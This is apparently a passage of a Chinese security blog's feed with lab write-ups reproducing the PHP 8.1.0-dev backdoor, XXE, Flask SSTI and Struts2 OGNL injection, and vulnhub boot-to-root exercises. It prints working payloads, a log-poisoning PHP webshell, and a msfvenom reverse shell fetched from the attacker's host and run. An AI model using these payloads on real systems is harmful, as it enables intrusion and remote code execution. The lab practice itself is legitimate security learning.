title="CVE-2012-2311"></a>CVE-2012-2311</h2><p>修改了，但没完全俢</p><p>通过空格加<code>-</code>进行绕过</p><div><h1>推荐文章<span style="font-size:0.45em; color:gray">（由<a href="https://github.com/huiwang/hexo-recommended-posts">hexo文章推荐插件</a>驱动）</span></h1><ul><li><a href="http://broken-year.github.io/2022/11/17/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb/">攻防世界WEB篇</a></li><li><a href="http://broken-year.github.io/2022/06/10/mysql-Authentication-bypass/">Mysql 身份认证绕过漏洞(CVE-2012-2122)</a></li><li><a href="http://broken-year.github.io/2022/06/07/xss-cookie/">Xss获取cookie</a></li><li><a href="https://blogs.kainy.cn/2010/09/CallVerifID（phonefactor）电话登陆认证方法/">CallVerifID（phonefactor）电话登陆认证方法</a></li></ul></div>]]></content>
      
      
      <categories>
          
          <category> 漏洞复现 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 环境搭建 </tag>
            
            <tag> 漏洞复现 </tag>
            
            <tag> 网络安全 </tag>
            
            <tag> vulhub </tag>
            
            <tag> CVE </tag>
            
            <tag> PHP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>php-8.1.0开发版本后门漏洞</title>
      <link href="/2022/05/05/php-backdoor/"/>
      <url>/2022/05/05/php-backdoor/</url>
      
        <content type="html"><![CDATA[<h1 id="PHP-8-1-0-dev开发版本后门事件"><a href="#PHP-8-1-0-dev开发版本后门事件" class="headerlink" title="PHP 8.1.0-dev开发版本后门事件"></a>PHP 8.1.0-dev开发版本后门事件</h1><h2 id="漏洞简述"><a href="#漏洞简述" class="headerlink" title="漏洞简述"></a>漏洞简述</h2><blockquote><p>PHP 8.1.0-dev 版本在2021年3月28日被植入后门，但是后门很快被发现并清除。当服务器存在该后门时，攻击者可以通过发送<strong>User-Agentt</strong>头来执行任意代码。</p></blockquote><h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><pre class=" language-Linux"><code class="language-Linux">cd /vulhub/php/8.1-backdoordocker-compose up -d</code></pre><h3 id="复现测试"><a href="#复现测试" class="headerlink" title="复现测试"></a>复现测试</h3><p>先打开burpsuite，抓取<code>http://192.168.3.151:8080</code>数据包</p><p>构造payload</p><pre class=" language-base"><code class="language-base">User-Agentt: zerodiumvar_dump(233*233);</code></pre><p><img src="/2022/05/05/php-backdoor/image-20220505161158695.png" alt="image-20220505161158695"></p><p>执行一下系统命令</p><pre class=" language-base"><code class="language-base">User-Agentt: zerodiumsystem('id');</code></pre><p><img src="/2022/05/05/php-backdoor/image-20220505161250514.png" alt="image-20220505161250514"></p><p>ok结束！</p><div><h1>推荐文章<span style="font-size:0.45em; color:gray">（由<a href="https://github.com/huiwang/hexo-recommended-posts">hexo文章推荐插件</a>驱动）</span></h1><ul><li><a href="http://broken-year.github.io/2022/11/17/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb/">攻防世界WEB篇</a></li><li><a href="http://broken-year.github.io/2022/06/10/mysql-Authentication-bypass/">Mysql 身份认证绕过漏洞(CVE-2012-2122)</a></li><li><a href="http://broken-year.github.io/2022/06/07/xss-cookie/">Xss获取cookie</a></li><li><a href="https://blogs.kainy.cn/2010/09/CallVerifID（phonefactor）电话登陆认证方法/">CallVerifID（phonefactor）电话登陆认证方法</a></li></ul></div>]]></content>
      
      
      <categories>
          
          <category> 漏洞复现 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 环境搭建 </tag>
            
            <tag> 漏洞复现 </tag>
            
            <tag> 网络安全 </tag>
            
            <tag> vulhub </tag>
            
            <tag> PHP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PHP XML外部实体注入漏洞(XXE)复现</title>
      <link href="/2022/05/05/php-xxe/"/>
      <url>/2022/05/05/php-xxe/</url>
      
        <content type="html"><![CDATA[<h1 id="PHP-XML外部实体注入漏洞复现"><a href="#PHP-XML外部实体注入漏洞复现" class="headerlink" title="PHP XML外部实体注入漏洞复现"></a>PHP XML外部实体注入漏洞复现</h1><h2 id="环境介绍"><a href="#环境介绍" class="headerlink" title="环境介绍"></a>环境介绍</h2><blockquote><p>PHP 7.0.30</p><p>libxml 2.8.0</p></blockquote><p>&#x3D;&#x3D;libxml2.9.0以后，默认不解析外部实体，导致XXE漏洞逐渐消亡。为了演示PHP环境下的XXE漏洞，本例会将libxml2.8.0版本编译进PHP中。PHP版本并不影响XXE利用。&#x3D;&#x3D;</p><h2 id="靶场搭建"><a href="#靶场搭建" class="headerlink" title="靶场搭建"></a>靶场搭建</h2><pre class=" language-Linux"><code class="language-Linux">cd /vulhub/php/php_xxedocker-compose up -d</code></pre><h2 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h2><p>先打开网页看看</p><p><img src="/2022/05/05/php-xxe/image-20220505153517058.png" alt="image-20220505153517058"></p><p>访问<code>http://192.168.3.151:8080/index.php</code>能看到phpinfo</p><p>在里面可以看到<code>libxml</code>版本</p><p><img src="/2022/05/05/php-xxe/image-20220505153702980.png" alt="image-20220505153702980"></p><p>Web目录为<code>www</code>，里面有4个文件</p><pre class=" language-Linux"><code class="language-Linux">tree .dom.php #使用DOMDocument解析bodyindex.phpSimpleXMLElement.php #使用SimpleXMLElement类解析bodySimplexml_load_string.php #使用simplexml_load_string函数解析body</code></pre><p>构造payload</p><pre class=" language-xml"><code class="language-xml"><span class="token prolog">&lt;?xml version="1.0" encoding="utf-8"?></span> <span class="token doctype">&lt;!DOCTYPE xxe [&lt;!ELEMENT name ANY ></span>&lt;!ENTITY xxe SYSTEM "file:///etc/passwd" >]><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>root</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>name</span><span class="token punctuation">></span></span><span class="token entity" title="&xxe;">&amp;xxe;</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>name</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>root</span><span class="token punctuation">></span></span></code></pre><p>打开burpsuite抓取数据包</p><p>然后把这玩意扔进去</p><p><img src="/2022/05/05/php-xxe/image-20220505154735442.png" alt="image-20220505154735442"></p><p>获得<code>/etc/passwd</code>里面的内容</p><p><img src="/2022/05/05/php-xxe/image-20220505154753664.png" alt="image-20220505154753664"></p><div><h1>推荐文章<span style="font-size:0.45em; color:gray">（由<a href="https://github.com/huiwang/hexo-recommended-posts">hexo文章推荐插件</a>驱动）</span></h1><ul><li><a href="http://broken-year.github.io/2022/11/17/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb/">攻防世界WEB篇</a></li><li><a href="http://broken-year.github.io/2022/06/10/mysql-Authentication-bypass/">Mysql 身份认证绕过漏洞(CVE-2012-2122)</a></li><li><a href="http://broken-year.github.io/2022/06/07/xss-cookie/">Xss获取cookie</a></li><li><a href="https://blogs.kainy.cn/2010/09/CallVerifID（phonefactor）电话登陆认证方法/">CallVerifID（phonefactor）电话登陆认证方法</a></li></ul></div>]]></content>
      
      
      <categories>
          
          <category> 漏洞复现 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 环境搭建 </tag>
            
            <tag> 漏洞复现 </tag>
            
            <tag> 网络安全 </tag>
            
            <tag> vulhub </tag>
            
            <tag> PHP </tag>
            
            <tag> XML </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>flask-ssti注入漏洞复现</title>
      <link href="/2022/05/05/flask-ssti/"/>
      <url>/2022/05/05/flask-ssti/</url>
      
        <content type="html"><![CDATA[<h1 id="Flask（Jinja2）-服务端模板注入漏洞"><a href="#Flask（Jinja2）-服务端模板注入漏洞" class="headerlink" title="Flask（Jinja2） 服务端模板注入漏洞"></a>Flask（Jinja2） 服务端模板注入漏洞</h1><h2 id="漏洞简介"><a href="#漏洞简介" class="headerlink" title="漏洞简介"></a>漏洞简介</h2><blockquote><p>SSTI(Server-Side Template Injection) 服务端模板注入<br>，就是服务器模板中拼接了恶意用户输入导致各种漏洞。通过模板，Web应用可以把输入转换成特定的HTML文件或者email格式</p></blockquote><h3 id="靶场搭建"><a href="#靶场搭建" class="headerlink" title="靶场搭建"></a>靶场搭建</h3><pre class=" language-Linux"><code class="language-Linux">cd /vulhub/flask/sstidocker-compose up -d</code></pre><h3 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h3><p>先看看源码</p><pre class=" language-Linux"><code class="language-Linux">cd srccat app.py</code></pre><p><img src="/2022/05/05/flask-ssti/image-20220505141805770.png" alt="image-20220505141805770"></p><p>打开网页看看</p><p><img src="/2022/05/05/flask-ssti/image-20220505141840374.png" alt="image-20220505141840374"></p><p>后面加参数试试</p><pre class=" language-base"><code class="language-base">?name=&#123;&#123;111*222&#125;&#125;</code></pre><p><img src="/2022/05/05/flask-ssti/image-20220505142008882.png" alt="image-20220505142008882"></p><p>构造poc</p><pre class=" language-base"><code class="language-base">&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__ == 'catch_warnings' %&#125;  &#123;% for b in c.__init__.__globals__.values() %&#125;  &#123;% if b.__class__ == &#123;&#125;.__class__ %&#125;    &#123;% if 'eval' in b.keys() %&#125;      &#123;&#123; b['eval']('__import__("os").popen("id").read()') &#125;&#125;    &#123;% endif %&#125;  &#123;% endif %&#125;  &#123;% endfor %&#125;&#123;% endif %&#125;&#123;% endfor %&#125;</code></pre><p><img src="/2022/05/05/flask-ssti/image-20220505142058804.png" alt="image-20220505142058804"></p><p>完事！结束！</p><div><h1>推荐文章<span style="font-size:0.45em; color:gray">（由<a href="https://github.com/huiwang/hexo-recommended-posts">hexo文章推荐插件</a>驱动）</span></h1><ul><li><a href="http://broken-year.github.io/2022/11/17/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb/">攻防世界WEB篇</a></li><li><a href="http://broken-year.github.io/2022/06/10/mysql-Authentication-bypass/">Mysql 身份认证绕过漏洞(CVE-2012-2122)</a></li><li><a href="http://broken-year.github.io/2022/06/07/xss-cookie/">Xss获取cookie</a></li><li><a href="https://chengzhaoxi.xyz/98c9615f.html">将Python嵌入C++</a></li></ul></div>]]></content>
      
      
      <categories>
          
          <category> 漏洞复现 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 环境搭建 </tag>
            
            <tag> 漏洞复现 </tag>
            
            <tag> 网络安全 </tag>
            
            <tag> vulhub </tag>
            
            <tag> Python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Struts2系列漏洞复现</title>
      <link href="/2022/05/04/Struts/"/>
      <url>/2022/05/04/Struts/</url>
      
        <content type="html"><![CDATA[<h1 id="Struts2系列漏洞复现"><a href="#Struts2系列漏洞复现" class="headerlink" title="Struts2系列漏洞复现"></a>Struts2系列漏洞复现</h1><h2 id="S2-001"><a href="#S2-001" class="headerlink" title="S2-001"></a>S2-001</h2><h3 id="漏洞简述"><a href="#漏洞简述" class="headerlink" title="漏洞简述"></a>漏洞简述</h3><blockquote><p>该漏洞因为用户提交表单数据并且验证失败时，后端会将用户之前提交的参数值使用 OGNL 表达式 %{value} 进行解析，然后重新填充到对应的表单数据中。例如注册或登录页面，提交失败后端一般会默认返回之前提交的数据，由于后端使用 %{value} 对提交的数据执行了一次 OGNL 表达式解析，所以可以直接构造 Payload 进行命令执行</p></blockquote><h3 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h3><blockquote><p>Struts 2.0.0 - Struts 2.0.8</p></blockquote><h3 id="靶场搭建"><a href="#靶场搭建" class="headerlink" title="靶场搭建"></a>靶场搭建</h3><pre class=" language-Linux"><code class="language-Linux">cd vulhub/struts2/s2-001docker-compose up -d</code></pre><h3 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h3><p>开始测试</p><p><img src="/2022/05/04/Struts/image-20220504194156399.png" alt="image-20220504194156399"></p><p>一开始长这个样子</p><p>输入代码</p><pre class=" language-base"><code class="language-base">%&#123;1+1&#125;</code></pre><p><img src="/2022/05/04/Struts/image-20220504194301478.png" alt="image-20220504194301478"></p><p>成功执行</p><p><img src="/2022/05/04/Struts/image-20220504194315328.png" alt="image-20220504194315328"></p><p>获取tomcat路径</p><pre class=" language-Linux"><code class="language-Linux">%&#123;"tomcatBinDir&#123;"+@java.lang.System@getProperty("user.dir")+"&#125;"&#125;</code></pre><p><img src="/2022/05/04/Struts/image-20220504194652923.png" alt="image-20220504194652923"></p><p>出来了</p><p>构造命令语句，太长了上burpsuite</p><pre class=" language-base"><code class="language-base">%&#123;#a=(new java.lang.ProcessBuilder(new java.lang.String[]&#123;"ls"&#125;)).redirectErrorStream(true).start(),#b=#a.getInputStream(),#c=new java.io.InputStreamReader(#b),#d=new java.io.BufferedReader(#c),#e=new char[50000],#d.read(#e),#f=#context.get("com.opensymphony.xwork2.dispatcher.HttpServletResponse"),#f.getWriter().println(new java.lang.String(#e)),#f.getWriter().flush(),#f.getWriter().close()&#125;</code></pre><p>使用其他的命令替换上面的<code>ls</code>就好了</p><p>在用之前要进行url编码，选中文本<code>Ctrl+u</code></p><p><img src="/2022/05/04/Struts/image-20220504195024232.png" alt="image-20220504195024232"></p><p>下一个</p><h2 id="S2-005"><a href="#S2-005" class="headerlink" title="S2-005"></a>S2-005</h2><h3 id="漏洞简述-1"><a href="#漏洞简述-1" class="headerlink" title="漏洞简述"></a>漏洞简述</h3><blockquote><p>S2-005是由于官方在修补S2-003不全面导致绕过补丁造成的。我们都知道访问Ognl的上下文对象必须要使用#符号，S2-003对#号进行过滤，但是没有考虑到unicode编码情况，导致\u0023或者8进制\43绕过。<br>S2-005则是绕过官方的安全配置（禁止静态方法调用和类方法执行），再次造成漏洞。</p></blockquote><h3 id="影响版本-1"><a href="#影响版本-1" class="headerlink" title="影响版本"></a>影响版本</h3><blockquote><p>Struts 2.0.0 - Struts 2.1.8.1</p></blockquote><h3 id="靶场搭建-1"><a href="#靶场搭建-1" class="headerlink" title="靶场搭建"></a>靶场搭建</h3><pre class=" language-Linux"><code class="language-Linux">cd vulhub/struts2/s2-005docker-compose up -d</code></pre><h3 id="测试-1"><a href="#测试-1" class="headerlink" title="测试"></a>测试</h3><p><img src="/2022/05/04/Struts/image-20220504205347532.png" alt="image-20220504205347532"></p><p>确实不知道怎么搞</p><p>用k8扫描一下</p><p><img src="/2022/05/04/Struts/image-20220504210156669.png" alt="image-20220504210156669"></p><p>确实是有，但是我不知道原理，先放着</p><p><img src="/2022/05/04/Struts/image-20220504210215429.png" alt="image-20220504210215429"></p><h2 id="S2-007"><a href="#S2-007" class="headerlink" title="S2-007"></a>S2-007</h2><h3 id="漏洞简述-2"><a href="#漏洞简述-2" class="headerlink" title="漏洞简述"></a>漏洞简述</h3><blockquote><p>age来自于用户输入，传递一个非整数给id导致错误，struts会将用户的输入当作ongl表达式执行，从而导致了漏洞</p></blockquote><h3 id="影响版本-2"><a href="#影响版本-2" class="headerlink" title="影响版本"></a>影响版本</h3><blockquote><p>Struts2.0.0 - 2.2.3</p></blockquote><h3 id="靶场搭建-2"><a href="#靶场搭建-2" class="headerlink" title="靶场搭建"></a>靶场搭建</h3><pre class=" language-Linux"><code class="language-Linux">cd vulhub/struts2/s2-007docker-compose up -d</code></pre><h3 id="测试-2"><a href="#测试-2" class="headerlink" title="测试"></a>测试</h3><p>首先查看界面</p><p><img src="/2022/05/04/Struts/image-20220505103443398.png" alt="image-20220505103443398"></p><p>在age中构造</p><pre class=" language-base"><code class="language-base">'+(1+1)+'</code></pre><p><img src="/2022/05/04/Struts/image-20220505110105916.png" alt="image-20220505110105916"></p><p>返回结果11</p><p><img src="/2022/05/04/Struts/image-20220505110125828.png" alt="image-20220505110125828"></p><p>抓包一下</p><p><img src="/2022/05/04/Struts/image-20220505104905991.png" alt="image-20220505104905991"></p><p>构造EXP</p><pre class=" language-base"><code class="language-base">' + (#_memberAccess["allowStaticMethodAccess"]=true,#foo=new java.lang.Boolean("false") ,#context["xwork.MethodAccessor.denyMethodExecution"]=#foo,@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec('id').getInputStream())) + '</code></pre><p>然后在里面用<code>Ctrl+u</code>进行url编码</p><p><img src="/2022/05/04/Struts/image-20220505111144687.png" alt="image-20220505111144687"></p><p>把<code>id</code>改成别的东西看看</p><p><img src="/2022/05/04/Struts/image-20220505111237064.png" alt="image-20220505111237064"></p><p>ok结束！</p><h2 id="S2-008"><a href="#S2-008" class="headerlink" title="S2-008"></a>S2-008</h2><h3 id="漏洞简述-3"><a href="#漏洞简述-3" class="headerlink" title="漏洞简述"></a>漏洞简述</h3><blockquote><p>S2-008 涉及多个漏洞，Cookie 拦截器错误配置可造成 OGNL 表达式执行，但是由于大多 Web 容器（如 Tomcat）对 Cookie 名称都有字符限制，一些关键字符无法使用使得这个点显得比较鸡肋。另一个比较鸡肋的点就是在 struts2 应用开启 devMode 模式后会有多个调试接口能够直接查看对象信息或直接执行命令，正如 kxlzx 所提这种情况在生产环境中几乎不可能存在，因此就变得很鸡肋的，但我认为也不是绝对的，万一被黑了专门丢了一个开启了 debug 模式的应用到服务器上作为后门也是有可能的。</p></blockquote><h3 id="影响版本-3"><a href="#影响版本-3" class="headerlink" title="影响版本"></a>影响版本</h3><blockquote><p>Struts2.0.0 - 2.2.3</p></blockquote><h3 id="靶场搭建-3"><a href="#靶场搭建-3" class="headerlink" title="靶场搭建"></a>靶场搭建</h3><pre class=" language-Linux"><code class="language-Linux">cd vulhub/struts2/s2-008docker-compose up -d</code></pre><h3 id="测试-3"><a href="#测试-3" class="headerlink" title="测试"></a>测试</h3><p>先看看页面</p><p><img src="/2022/05/04/Struts/image-20220505112031695.png" alt="image-20220505112031695"></p><p>构造payload</p><pre class=" language-base"><code class="language-base">/devmode.action? debug=command&expression=(#a=(new java.lang.ProcessBuilder(new java.lang.String[]&#123;"id"&#125;)).redirectErrorStream(true).start(),#b=#a.getInputStream(),#c=new java.io.InputStreamReader(#b),#d=new java.io.BufferedReader(#c),#e=new char[5000],#d.read(#e),#f=#context.get("com.opensymphony.xwork2.dispatcher.HttpServletResponse"),#f.getWriter().println(new java.lang.String(#e)),#f.getWriter().flush(),#f.getWriter().close())</code></pre><p>进行url编码</p><p><img src="/2022/05/04/Struts/image-20220505124144467.png" alt="image-20220505124144467"></p><p>结束！</p><div><h1>推荐文章<span style="font-size:0.45em; color:gray">（由<a href="https://github.com/huiwang/hexo-recommended-posts">hexo文章推荐插件</a>驱动）</span></h1><ul><li><a href="http://broken-year.github.io/2022/11/17/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb/">攻防世界WEB篇</a></li><li><a href="http://broken-year.github.io/2022/06/10/mysql-Authentication-bypass/">Mysql 身份认证绕过漏洞(CVE-2012-2122)</a></li><li><a href="http://broken-year.github.io/2022/06/07/xss-cookie/">Xss获取cookie</a></li><li><a href="https://blogs.kainy.cn/2010/09/CallVerifID（phonefactor）电话登陆认证方法/">CallVerifID（phonefactor）电话登陆认证方法</a></li></ul></div>]]></content>
      
      
      <categories>
          
          <category> 漏洞复现 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 环境搭建 </tag>
            
            <tag> 漏洞复现 </tag>
            
            <tag> 网络安全 </tag>
            
            <tag> vulhub </tag>
            
            <tag> CVE </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>综合实战第三章-日志注入实战</title>
      <link href="/2022/05/03/theEther/"/>
      <url>/2022/05/03/theEther/</url>
      
        <content type="html"><![CDATA[<h1 id="综合实战第三章"><a href="#综合实战第三章" class="headerlink" title="综合实战第三章"></a>综合实战第三章</h1><h2 id="日志注入实战"><a href="#日志注入实战" class="headerlink" title="日志注入实战"></a>日志注入实战</h2><h3 id="环境准备"><a href="#环境准备" class="headerlink" title="环境准备"></a>环境准备</h3><blockquote><p>靶场下载：<a href="https://www.vulnhub.com/entry/the-ether-evilscience-v101,212/">https://www.vulnhub.com/entry/the-ether-evilscience-v101,212/</a></p><p>攻击机:</p><p>kali 192.168.3.134</p><p>win7 192.168.3.137</p><p>靶机:evilscience 192.168.3.173</p></blockquote><h3 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h3><p>先看看这个靶场的端口信息</p><pre class=" language-Linux"><code class="language-Linux">nmap -p- -A 192.168.3.173</code></pre><p><img src="/2022/05/03/theEther/image-20220503171914748.png" alt="image-20220503171914748"></p><p>先打开网站看看</p><p><img src="/2022/05/03/theEther/image-20220503172801639.png" alt="image-20220503172801639"></p><p>在<code>ABOUT US</code>里发现应该有文件包含漏洞</p><p><img src="/2022/05/03/theEther/image-20220503185010583.png" alt="image-20220503185010583"></p><p>抓包然后放到intruder用字典跑一下</p><p><img src="/2022/05/03/theEther/image-20220503191507832.png" alt="image-20220503191507832"></p><p>跑出来一些东西</p><p><img src="/2022/05/03/theEther/image-20220503195814460.png" alt="image-20220503195814460"></p><p>看到了ssh的日志文件</p><p><img src="/2022/05/03/theEther/image-20220503200630846.png" alt="image-20220503200630846"></p><p>可以构造一句话木马写入日志里</p><pre class=" language-Linux"><code class="language-Linux">ssh '<?php eval($_GET['cmd'])?>'@192.168.3.173</code></pre><p>然后在burpsuite里构造</p><pre class=" language-Linux"><code class="language-Linux">?file=/var/log/auth.log&cmd=phpinfo();</code></pre><p><img src="/2022/05/03/theEther/image-20220503201136938.png" alt="image-20220503201136938"></p><p>测试成功！</p><h3 id="上传木马"><a href="#上传木马" class="headerlink" title="上传木马"></a>上传木马</h3><p>先制作木马</p><pre class=" language-Linux"><code class="language-Linux">msfvenom -p linux/x86/meterpreter/reverse_tcp lhost=192.168.3.134 lport=4444 -f elf > /root/shell.elf</code></pre><p>打开msf</p><pre class=" language-Linux"><code class="language-Linux">msfconsoleuse exploit/multi/handlerset payload linux/x86/meterpreter/reverse_tcpset lhost 192.168.3.134exploit</code></pre><p>再打开http</p><pre class=" language-Linux"><code class="language-Linux">python -m SimpleHTTPServer</code></pre><p>设置好监听之后，准备上传</p><p>构造上传语句</p><pre class=" language-Linux"><code class="language-Linux">/?file=/var/log/auth.log&cmd=system('wget+http://192.168.3.134:8000/shell.elf');/?file=/var/log/auth.log&cmd=system('chmod+%2bx+shell.elf');/?file=/var/log/auth.log&cmd=system('./shell.elf')%3b</code></pre><p>连接成功！</p><p><img src="/2022/05/03/theEther/image-20220503202449616.png" alt="image-20220503202449616"></p><h3 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h3><p>接下来就是提权了</p><p>先美化</p><pre class=" language-Linux"><code class="language-Linux">python -c 'import pty;pty.spawn("/bin/bash")'</code></pre><p>然后找一下权限</p><p><img src="/2022/05/03/theEther/image-20220503202859959.png" alt="image-20220503202859959"></p><p>看到有个root权限的</p><p>看下怎么用</p><p>发现是个查看日志文件的程序</p><p>再打开一个msf</p><p>和上面配置一样，设置好监听</p><p>构造语句</p><pre class=" language-Linux"><code class="language-Linux">sudo ./xxxlogauditorxxx.py/var/log/auth.log|./shell.elf</code></pre><p>成功连接</p><p><img src="/2022/05/03/theEther/image-20220503203718563.png" alt="image-20220503203718563"></p><h3 id="找到flag"><a href="#找到flag" class="headerlink" title="找到flag"></a>找到flag</h3><p>进入根目录，发现有个flag.png文件，把他传到本地，然后查看</p><p><img src="/2022/05/03/theEther/image-20220503204521117.png" alt="image-20220503204521117"></p><p>发现flag不在这，用cat查看一下</p><pre class=" language-Linux"><code class="language-Linux">cat flag.png</code></pre><p><img src="/2022/05/03/theEther/image-20220503204619803.png" alt="image-20220503204619803"></p><p>看到有一段64编码的，把他提出来解密</p><pre class=" language-Linux"><code class="language-Linux">base64 -d bsflag.txt > flag.txt</code></pre><p><img src="/2022/05/03/theEther/image-20220503204836099.png" alt="image-20220503204836099"></p><p>得到flag，结束！</p><div><h1>推荐文章<span style="font-size:0.45em; color:gray">（由<a href="https://github.com/huiwang/hexo-recommended-posts">hexo文章推荐插件</a>驱动）</span></h1><ul><li><a href="http://broken-year.github.io/2022/11/17/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb/">攻防世界WEB篇</a></li><li><a href="http://broken-year.github.io/2022/06/10/mysql-Authentication-bypass/">Mysql 身份认证绕过漏洞(CVE-2012-2122)</a></li><li><a href="http://broken-year.github.io/2022/06/07/xss-cookie/">Xss获取cookie</a></li><li><a href="https://blogs.kainy.cn/2010/09/CallVerifID（phonefactor）电话登陆认证方法/">CallVerifID（phonefactor）电话登陆认证方法</a></li></ul></div>]]></content>
      
      
      <categories>
          
          <category> 靶场练习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 网络安全 </tag>
            
            <tag> 综合实战 </tag>
            
            <tag> 渗透测试 </tag>
            
            <tag> 靶场练习 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>综合实战第三章-特殊抓包实战</title>
      <link href="/2022/05/03/DomDom/"/>
      <url>/2022/05/03/DomDom/</url>
      
        <content type="html"><![CDATA[<h1 id="综合实战第三章"><a href="#综合实战第三章" class="headerlink" title="综合实战第三章"></a>综合实战第三章</h1><h2 id="特殊抓包实战"><a href="#特殊抓包实战" class="headerlink" title="特殊抓包实战"></a>特殊抓包实战</h2><h3 id="环境准备"><a href="#环境准备" class="headerlink" title="环境准备"></a>环境准备</h3><blockquote><p>靶场下载：<a href="https://www.vulnhub.com/entry/domdom-1,328/">https://www.vulnhub.com/entry/domdom-1,328/</a></p><p>攻击机:</p><p>kali 192.168.3.134</p><p>win7 192.168.3.137</p><p>靶机:DomDom 192.168.3.172</p></blockquote><h3 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h3><p>熟悉的nmap，熟悉的信息搜集</p><pre class=" language-Linux"><code class="language-Linux">nmap -p- -A 192.168.3.172</code></pre><p><img src="/2022/05/03/DomDom/image-20220503151326941.png" alt="image-20220503151326941"></p><p>开放80端口，打开网页看看</p><p><img src="/2022/05/03/DomDom/image-20220503151435768.png" alt="image-20220503151435768"></p><p>嗯抓包看看</p><p><img src="/2022/05/03/DomDom/image-20220503153629826.png" alt="image-20220503153629826"></p><p>也没啥东西</p><p>扫描一下网站目录吧</p><pre class=" language-Linux"><code class="language-Linux">dirsearch -u http://192.168.3.172</code></pre><p><img src="/2022/05/03/DomDom/image-20220503154224197.png" alt="image-20220503154224197"></p><p>看到有这些东西，去看看</p><p><img src="/2022/05/03/DomDom/image-20220503154321032.png" alt="image-20220503154321032"></p><p>这乍一看看不出啥，抓包看看</p><p><img src="/2022/05/03/DomDom/image-20220503154618196.png" alt="image-20220503154618196"></p><p>也没啥东西</p><p>在主页面抓包，然后把<code>/index.php</code>改成<code>/admin.php</code>试试</p><p>回显出东西了！</p><p><img src="/2022/05/03/DomDom/image-20220503154812204.png" alt="image-20220503154812204"></p><p>可以构造参数试试</p><p><img src="/2022/05/03/DomDom/image-20220503154856250.png" alt="image-20220503154856250"></p><p>确定可以命令执行</p><h3 id="上传木马"><a href="#上传木马" class="headerlink" title="上传木马"></a>上传木马</h3><p>先制作一个木马文件</p><pre class=" language-Linux"><code class="language-Linux">weevely generate 123456 /root/shell.php </code></pre><p>python打开http</p><pre class=" language-Linux"><code class="language-Linux">python -m SimpleHTTPServer</code></pre><p>然后构造语句</p><pre class=" language-Linux"><code class="language-Linux">wget http://192.168.3.134:8000/shell.php</code></pre><p><img src="/2022/05/03/DomDom/image-20220503155548896.png" alt="image-20220503155548896"></p><p>上传</p><p><img src="/2022/05/03/DomDom/image-20220503155607458.png" alt="image-20220503155607458"></p><p>上传成功，接下来尝试连接</p><pre class=" language-Linux"><code class="language-Linux">weevely http://192.168.3.172:8000/shell.php 123456</code></pre><h3 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h3><p>查看linux版本</p><pre class=" language-Linux"><code class="language-Linux">uname -a </code></pre><p><img src="/2022/05/03/DomDom/image-20220503155907584.png" alt="image-20220503155907584"></p><p>先下载个脏牛漏洞然后扔进去，我没成功</p><div><h1>推荐文章<span style="font-size:0.45em; color:gray">（由<a href="https://github.com/huiwang/hexo-recommended-posts">hexo文章推荐插件</a>驱动）</span></h1><ul><li><a href="http://broken-year.github.io/2022/11/17/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb/">攻防世界WEB篇</a></li><li><a href="http://broken-year.github.io/2022/06/10/mysql-Authentication-bypass/">Mysql 身份认证绕过漏洞(CVE-2012-2122)</a></li><li><a href="http://broken-year.github.io/2022/06/07/xss-cookie/">Xss获取cookie</a></li><li><a href="https://blogs.kainy.cn/2010/09/CallVerifID（phonefactor）电话登陆认证方法/">CallVerifID（phonefactor）电话登陆认证方法</a></li></ul></div>]]></content>
      
      
      <categories>
          
          <category> 靶场练习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 网络安全 </tag>
            
            <tag> 综合实战 </tag>
            
            <tag> 渗透测试 </tag>
            
            <tag> 靶场练习 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>综合实战第三章-异常端口实战</title>
      <link href="/2022/05/02/djinn/"/>
      <url>/2022/05/02/djinn/</url>
      
